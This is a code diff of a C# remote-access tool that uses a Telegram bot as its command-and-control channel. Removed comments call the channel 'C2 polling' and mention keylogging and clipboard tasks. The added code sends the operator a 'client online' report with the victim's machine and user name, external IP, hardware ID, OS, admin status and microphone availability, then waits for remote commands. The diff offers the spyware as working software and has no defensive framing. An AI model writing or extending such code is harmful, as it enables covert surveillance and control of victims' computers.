@@ -5,7 +5,10 @@ using System.Threading.Tasks;
 using Telegram.Bot;
 using Telegram.Bot.Types;
 using Telegram.Bot.Types.Enums;
+using Telegram.Bot.Types.ReplyMarkups;
 using VanguardCore;
+using System.Diagnostics.CodeAnalysis;
+using System.Collections.Generic;
 
 namespace FinalBot
 {
@@ -16,91 +19,79 @@ namespace FinalBot
         private readonly CommandHandler _commandHandler;
         private bool _isRunning = true;
 
+        [DynamicDependency(DynamicallyAccessedMemberTypes.All, typeof(List<UpdateType>))]
+        [DynamicDependency(DynamicallyAccessedMemberTypes.All, typeof(UpdateType))]
         public BotOrchestrator(string token, string adminId)
         {
             _botClient = new TelegramBotClient(token);
             _adminId = adminId;
             _commandHandler = new CommandHandler(_botClient, _adminId);
+            TelegramService.Initialize(token, adminId);
+
+            // NativeAOT Hint: preserve generic list of UpdateType
+            GC.KeepAlive(new System.Collections.Generic.List<UpdateType>());
         }
 
         public async Task StartAsync()
         {
             Console.WriteLine("[ORCHESTRATOR] Starting services...");
             
-            // 1. Initial Report
+            // 1. Initial Report (via Telegram as fallback/sender)
             await SendStartupReport();
 
-            // 2. Start Polling
-            var cts = new CancellationTokenSource();
+            Console.WriteLine("[ORCHESTRATOR] Telegram Polling active.");
+
+            var receiverOptions = new Telegram.Bot.Polling.ReceiverOptions
+            {
+                AllowedUpdates = null // This allows all updates and avoids the generic list trimming issue
+            };
+
             _botClient.StartReceiving(
-                updateHandler: HandleUpdateAsync,
-                pollingErrorHandler: HandlePollingErrorAsync,
-                receiverOptions: new Telegram.Bot.Polling.ReceiverOptions { AllowedUpdates = Array.Empty<UpdateType>() },
-                cancellationToken: cts.Token
+                updateHandler: _commandHandler.HandleUpdateAsync,
+                pollingErrorHandler: _commandHandler.HandlePollingErrorAsync,
+                receiverOptions: receiverOptions,
+                cancellationToken: default
             );
 
-            Console.WriteLine("[ORCHESTRATOR] C2 Polling active.");
-
-            // 3. Main Background Loop (Keylogging, Clipboard, etc.)
+            // Keep alive
             while (_isRunning)
             {
-                try 
-                {
-                    // Placeholder for periodic tasks (like periodic keylog sending)
-                    await Task.Delay(1000); 
-                }
-                catch (Exception ex)
-                {
-                    Console.WriteLine($"[LOOP ERROR] {ex.Message}");
-                }
+                await Task.Delay(1000);
             }
-        }
-
-        private async Task HandleUpdateAsync(ITelegramBotClient botClient, Update update, CancellationToken cancellationToken)
-        {
-            _ = Task.Run(async () =>
-            {
-                try
-                {
-                    if (update.Message is { } message)
-                    {
-                        if (message.From?.Id.ToString() != _adminId) return;
-                        Logger.Info($"[C2] Command: {message.Text}");
-                        await _commandHandler.HandleCommand(message);
-                    }
-                    else if (update.CallbackQuery is { } callbackQuery)
-                    {
-                        if (callbackQuery.From?.Id.ToString() != _adminId) return;
-                        Logger.Info($"[C2] Callback: {callbackQuery.Data}");
-                        await _commandHandler.HandleCallbackQuery(callbackQuery);
-                    }
-                }
-                catch (Exception ex)
-                {
-                    Logger.Error("Exception while handling Telegram update", ex);
-                }
-            }, cancellationToken);
-        }
-
-        private Task HandlePollingErrorAsync(ITelegramBotClient botClient, Exception exception, CancellationToken cancellationToken)
-        {
-            Logger.Error($"[POLLING ERROR]", exception);
-            return Task.CompletedTask;
         }
 
         private async Task SendStartupReport()
         {
-            string info = $"🚀 New PC Online\n" +
-                          $"🖥️ PC:{Environment.MachineName}\n" +
-                          $"👤 User: {Environment.UserName}\n" +
-                          $"🌐 OS: {Environment.OSVersion}\n" +
-                          $"⏰ Time: {DateTime.Now:yyyy-MM-dd HH:mm:ss}";
+            string pcUser = $"{Environment.MachineName}\\{Environment.UserName}";
+            string extIp = FinalBot.Modules.SystemInfoModule.GetExternalIP();
+            string hwid = FinalBot.Modules.SystemInfoModule.GetHWID();
+            string osVer = Environment.OSVersion.ToString();
+            string adminStatus = VanguardCore.ElevationService.IsAdmin() ? "🟢 АДМИН" : "🟡 Обычный Юзер";
 
-            await _botClient.SendTextMessageAsync(
-                chatId: _adminId,
-                text: info,
-                parseMode: ParseMode.Markdown
-            );
+            string info = $"🚀 <b>КЛИЕНТ ОНЛАЙН</b>\n" +
+                          $"━━━━━━━━━━━━━━━━━━\n" +
+                          $"👤 <b>ID:</b> <code>{pcUser} ({hwid})</code>\n" +
+                          $"🌐 <b>IP:</b> <code>{extIp}</code>\n" +
+                          $"🖥️ <b>Система:</b> <code>{osVer}</code>\n" +
+                          $"⚡ <b>Статус:</b> <code>{adminStatus}</code>\n" +
+                          $"🎤 <b>Микрофон:</b> ✅\n" +
+                          $"⌚ <b>Время:</b> <code>{DateTime.Now:yyyy-MM-dd HH:mm:ss}</code>\n" +
+                          $"━━━━━━━━━━━━━━━━━━";
+            var inlineKeyboard = new InlineKeyboardMarkup(new[]
+            {
+                new [] { InlineKeyboardButton.WithCallbackData("🎮 Админ-Панель", "admin_panel") }
+            });
+
+            try 
+            {
+                await _botClient.SendTextMessageAsync(
+                    chatId: _adminId,
+                    text: info,
+                    parseMode: ParseMode.Html,
+                    replyMarkup: inlineKeyboard
+                );
+            }
+            catch { }
         }
 
         public void Stop()
